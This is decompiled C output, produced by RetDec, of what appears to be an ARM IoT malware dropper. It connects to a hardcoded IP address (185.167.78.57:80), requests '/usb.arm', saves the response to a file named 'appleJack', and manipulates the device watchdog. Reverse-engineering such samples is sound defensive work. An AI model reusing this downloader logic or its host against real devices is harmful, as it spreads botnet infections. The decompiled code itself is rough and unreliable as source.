//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) 2018 Retargetable Decompiler <info@retdec.com>
//

#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <stropts.h>
#include <unistd.h>

// ------------------- Function Prototypes --------------------

int32_t entry_point(void);
int32_t function_8074(uint32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t function_80b4(int32_t a1);
int32_t function_80c4(int32_t a1);
int32_t function_80d4(int32_t a1, int32_t a2, int32_t a3);
int32_t function_80f0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_8118(int32_t a1, int32_t a2, int32_t a3);
int32_t function_8134(int32_t a1, int32_t a2, int32_t a3);
int32_t function_8150(int32_t a1, int32_t a2, int32_t a3);
int32_t function_8178(void);
int32_t function_8300(int32_t * a1, int32_t a2);
int32_t function_831c(int32_t a1);
int32_t function_839c(int32_t syscall_number, int32_t a2);
int32_t function_83cc(int32_t fd, int32_t request, int32_t a3, int32_t a4, int32_t a5);
int32_t function_841c(char * path, int32_t oflag);
int32_t function_8478(int32_t a1);
int32_t function_8488(void);

// ------------------------ Functions -------------------------

// Address range: 0x8074 - 0x80b3
int32_t function_8074(uint32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    int32_t v1 = 0;
    int32_t v2 = -0x1e5ff000;
    // entry
    return 256 * a2 & 0xff00 | a1 % 256 | 0x1000000 * a4 | 0x10000 * a3 & 0xff0000;
}

// Address range: 0x80b4 - 0x80c3
int32_t function_80b4(int32_t a1) {
    int32_t v1;
    int32_t v2;
    int32_t v3 = function_839c(0x900001, a1); // 0x80bc
    int32_t result = v3; // 0x80c0
    bool v4;
    if (v4) {
        // bb
        result = v3 + a1;
        // branch -> bb2
    }
    // bb2
    return result;
}

// Address range: 0x80c4 - 0x80d3
int32_t function_80c4(int32_t a1) {
    int32_t v1;
    int32_t v2;
    int32_t v3 = function_839c(0x900006, a1); // 0x80cc
    int32_t result = v3; // 0x80d0
    bool v4;
    if (v4) {
        // bb
        int32_t v5;
        result = v5 + v3;
        // branch -> bb2
    }
    // bb2
    return result;
}

// Address range: 0x80d4 - 0x80ef
int32_t function_80d4(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1;
    int32_t v2;
    int32_t v3 = function_839c(0x900005, a1); // 0x80e8
    int32_t result = v3; // 0x80ec
    bool v4;
    if (v4) {
        // bb
        int32_t v5;
        result = v5 + v3;
        // branch -> bb2
    }
    // bb2
    return result;
}

// Address range: 0x80f0 - 0x8117
int32_t function_80f0(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1;
    int32_t v2;
    // 0x80f0
    return function_839c(0x900066, 3);
}

// Address range: 0x8118 - 0x8133
int32_t function_8118(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1;
    int32_t v2;
    int32_t v3 = function_839c(0x900004, a1); // 0x812c
    int32_t result = v3; // 0x8130
    bool v4;
    if (v4) {
        // bb
        int32_t v5;
        result = v5 + v3;
        // branch -> bb2
    }
    // bb2
    return result;
}

// Address range: 0x8134 - 0x814f
int32_t function_8134(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1;
    int32_t v2;
    int32_t v3 = function_839c(0x900003, a1); // 0x8148
    int32_t result = v3; // 0x814c
    bool v4;
    if (v4) {
        // bb
        result = a3 + v3;
        // branch -> bb2
    }
    // bb2
    return result;
}

// Address range: 0x8150 - 0x8177
int32_t function_8150(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1;
    int32_t v2;
    // 0x8150
    return function_839c(0x900066, 1);
}

// Address range: 0x8178 - 0x82ff
int32_t function_8178(void) {
    int32_t v1;
    int32_t v2 = (int32_t)"arm" + 1; // 0x8188
    unsigned char v3; // 0x818c
    int32_t v4 = v3;
    // branch -> 0x8188
    while (v3 != 0) {
        // 0x8188
        v2++;
        v4 = v3;
        // continue -> 0x8188
    }
    // 0x8198
    int32_t v5; // bp-172
    int32_t v6 = &v5; // 0x8180
    int32_t v7 = v2 - (int32_t)"arm"; // r8
    function_8118(1, (int32_t)"APPLE\n", 6);
    int32_t v8 = 2; // bp-44
    int32_t v9 = 0x1000000 * v4 / 0x1000000; // 0x81d8
    function_8074(185, 167, 78, 57, 2, v9, v9, 80);
    int32_t v10 = function_80d4((int32_t)"appleJack", 577, 511); // r7
    int32_t v11 = function_8150(2, 1, v4); // 0x8200
    int32_t v12;
    int32_t v13;
    char v14; // bp-25
    int32_t v15; // 0x8248
    int32_t v16; // 0x825c
    int32_t v17; // 0x8224
    int32_t v18; // 0x8278
    int32_t v19; // 0x82a8
    int32_t v20; // 0x82a831
    int32_t v21; // 0x8258
    int32_t v22; // 0x828c
    if (v11 == -1) {
        // .thread
        v13 = -1;
        // branch -> bb24
        // bb24
        // branch -> bb25
        // bb25
        __pseudo_cond_branch(true, (int32_t)&v12);
        v17 = function_80f0(v13, (int32_t)&v8, 16);
        if (v17 < 0) {
            // 0x8230
            function_8118(1, (int32_t)"NIF\n", 4);
            function_80b4(-v17);
            // branch -> 0x8248
        }
        // 0x8248
        v15 = v7 + 29;
        v21 = function_8118(v13, (int32_t)"GET /usb.arm HTTP/1.0\r\n\r\n", v15);
        v16 = v15;
        if (v21 != v16) {
            // bb26
            // branch -> bb27
        }
        // bb27
        __pseudo_cond_branch(v21 != v16, (int32_t)&v12);
        v18 = function_8134(v13, (int32_t)&v14, 1);
        __pseudo_cond_branch(v18 != 1, (int32_t)&v12);
        v22 = 256 * v4 | (int32_t)v14;
        // branch -> 0x826c
        while (v22 != 0xd0a0d0a) {
            // 0x826c
            v18 = function_8134(v13, (int32_t)&v14, 1);
            __pseudo_cond_branch(v18 != 1, (int32_t)&v12);
            v22 = 256 * v22 | (int32_t)v14;
            // continue -> 0x826c
        }
        // 0x829c
        v20 = function_8134(v13, v6, 128);
        if (v20 < 1) {
            // 0x82c8
            function_80c4(v13);
            function_80c4(v10);
            function_8118(1, (int32_t)"JACK\n", 5);
            return function_80b4(5);
        }
        function_8118(v10, v6, v20);
        v19 = function_8134(v13, v6, 128);
        while (v19 >= 1) {
            // 0x82c0
            function_8118(v10, v6, v19);
            v19 = function_8134(v13, v6, 128);
            // continue -> 0x82c0
        }
        // 0x82c8
        function_80c4(v13);
        function_80c4(v10);
        function_8118(1, (int32_t)"JACK\n", 5);
        return function_80b4(5);
    }
    // bb
    v13 = v11;
    if (v10 != -1) {
        // bb25
        __pseudo_cond_branch(false, (int32_t)&v12);
        v17 = function_80f0(v13, (int32_t)&v8, 16);
        if (v17 < 0) {
            // 0x8230
            function_8118(1, (int32_t)"NIF\n", 4);
            function_80b4(-v17);
            // branch -> 0x8248
        }
        // 0x8248
        v15 = v7 + 29;
        v21 = function_8118(v13, (int32_t)"GET /usb.arm HTTP/1.0\r\n\r\n", v15);
        v16 = v15;
        if (v21 != v16) {
            // bb26
            // branch -> bb27
        }
        // bb27
        __pseudo_cond_branch(v21 != v16, (int32_t)&v12);
        v18 = function_8134(v13, (int32_t)&v14, 1);
        __pseudo_cond_branch(v18 != 1, (int32_t)&v12);
        v22 = 256 * v4 | (int32_t)v14;
        // branch -> 0x826c
        while (v22 != 0xd0a0d0a) {
            // 0x826c
            v18 = function_8134(v13, (int32_t)&v14, 1);
            __pseudo_cond_branch(v18 != 1, (int32_t)&v12);
            v22 = 256 * v22 | (int32_t)v14;
            // continue -> 0x826c
        }
        // 0x829c
        v20 = function_8134(v13, v6, 128);
        if (v20 < 1) {
            // 0x82c8
            function_80c4(v13);
            function_80c4(v10);
            function_8118(1, (int32_t)"JACK\n", 5);
            return function_80b4(5);
        }
        function_8118(v10, v6, v20);
        v19 = function_8134(v13, v6, 128);
        while (v19 >= 1) {
            // 0x82c0
            function_8118(v10, v6, v19);
            v19 = function_8134(v13, v6, 128);
            // continue -> 0x82c0
        }
        // 0x82c8
        function_80c4(v13);
        function_80c4(v10);
        function_8118(1, (int32_t)"JACK\n", 5);
        return function_80b4(5);
    }
    // bb24
    // branch -> bb25
    // bb25
    __pseudo_cond_branch(true, (int32_t)&v12);
    v17 = function_80f0(v13, (int32_t)&v8, 16);
    if (v17 < 0) {
        // 0x8230
        function_8118(1, (int32_t)"NIF\n", 4);
        function_80b4(-v17);
        // branch -> 0x8248
    }
    // 0x8248
    v15 = v7 + 29;
    v21 = function_8118(v13, (int32_t)"GET /usb.arm HTTP/1.0\r\n\r\n", v15);
    v16 = v15;
    if (v21 != v16) {
        // bb26
        // branch -> bb27
    }
    // bb27
    __pseudo_cond_branch(v21 != v16, (int32_t)&v12);
    v18 = function_8134(v13, (int32_t)&v14, 1);
    __pseudo_cond_branch(v18 != 1, (int32_t)&v12);
    v22 = 256 * v4 | (int32_t)v14;
    // branch -> 0x826c
    while (v22 != 0xd0a0d0a) {
        // 0x826c
        v18 = function_8134(v13, (int32_t)&v14, 1);
        __pseudo_cond_branch(v18 != 1, (int32_t)&v12);
        v22 = 256 * v22 | (int32_t)v14;
        // continue -> 0x826c
    }
    // 0x829c
    v20 = function_8134(v13, v6, 128);
    if (v20 < 1) {
        // 0x82c8
        function_80c4(v13);
        function_80c4(v10);
        function_8118(1, (int32_t)"JACK\n", 5);
        return function_80b4(5);
    }
    function_8118(v10, v6, v20);
    v19 = function_8134(v13, v6, 128);
    while (v19 >= 1) {
        // 0x82c0
        function_8118(v10, v6, v19);
        v19 = function_8134(v13, v6, 128);
        // continue -> 0x82c0
    }
    // 0x82c8
    function_80c4(v13);
    function_80c4(v10);
    function_8118(1, (int32_t)"JACK\n", 5);
    return function_80b4(5);
}

// Address range: 0x8300 - 0x831b
int32_t function_8300(int32_t * a1, int32_t a2) {
    int32_t v1;
    int32_t v2;
    int32_t v3 = (int32_t)a1;
    int32_t result = v3; // 0x8304
    bool v4;
    if (v4) {
        // bb
        result = (a2 / 16 & v3) - 0x830c;
        // branch -> .thread
    }
    // .thread
    return result;
}

// Address range: 0x831c - 0x838b
int32_t function_831c(int32_t a1) {
    int32_t v1;
    int32_t v2;
    // 0x831c
    int32_t v3; // bp-12
    int32_t v4 = &v3; // 0x8324
    int32_t v5 = function_841c("/dev/watchdog", 2); // 0x832c
    int32_t result; // 0x837c
    if (v5 != -1) {
        // 0x8354
        v3 = 1;
        function_83cc(v5, -0x7ffba8fc, v4, 1, 1);
        result = function_80c4(v5);
        // branch -> 0x8378
        // 0x8378
        return result;
    }
    int32_t v6 = function_841c("/dev/misc/watchdog", 2); // 0x8344
    if (v6 != -1) {
        // 0x8354
        v3 = 1;
        function_83cc(v6, -0x7ffba8fc, v4, 1, 1);
        result = function_80c4(v6);
        // branch -> 0x8378
    } else {
        result = -1;
    }
    // 0x8378
    return result;
}

// Address range: 0x838c - 0x839b
int32_t entry_point(void) {
    int32_t v1;
    int32_t v2;
    // entry
    return function_831c(function_8178());
}

// Address range: 0x839c - 0x83cb
int32_t function_839c(int32_t syscall_number, int32_t a2) {
    int32_t v1;
    int32_t v2;
    int32_t result = syscall(syscall_number); // 0x83a8
    if (result < 0xfffff001) {
        // bb
        return result;
    }
    // bb7
    function_8488();
    return -1;
}

// Address range: 0x83cc - 0x841b
int32_t function_83cc(int32_t fd, int32_t request, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1;
    int32_t v2;
    int32_t v3 = ioctl(fd, request); // 0x83e8
    int32_t result; // 0x8408
    if (v3 >= 0xfffff001) {
        // 0x83f8
        function_8488();
        result = -1;
        // branch -> 0x8408
    } else {
        result = v3;
    }
    // 0x8408
    return result;
}

// Address range: 0x841c - 0x8477
int32_t function_841c(char * path, int32_t oflag) {
    int32_t v1;
    int32_t v2;
    // 0x841c
    if ((oflag & 64) != 0) {
        // bb
        // branch -> .thread
    }
    int32_t fd = open(path, oflag); // 0x8444
    int32_t result; // 0x8464
    if (fd >= 0xfffff001) {
        // 0x8454
        function_8488();
        result = -1;
        // branch -> 0x8464
    } else {
        result = fd;
    }
    // 0x8464
    return result;
}

// Address range: 0x8478 - 0x8487
int32_t function_8478(int32_t a1) {
    int32_t v1;
    int32_t v2;
    int32_t v3 = function_841c(NULL, 577); // 0x8480
    int32_t result = v3; // 0x8484
    bool v4;
    if (v4) {
        // bb
        result = v3 & 36;
        // branch -> bb2
    }
    // bb2
    return result;
}

// Address range: 0x8488 - 0x8493
int32_t function_8488(void) {
    int32_t v1;
    // 0x8488
    int32_t v2;
    return &v2;
}

// ------------------ System-Call Functions -------------------

// int ioctl(int fd, unsigned long int request, ...);
// int open(const char * file, int oflag, ...);
// long int syscall(long int sysno, ...);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: gc
// Detected functions: 17
// Decompilation date: 2018-03-24 22:56:34
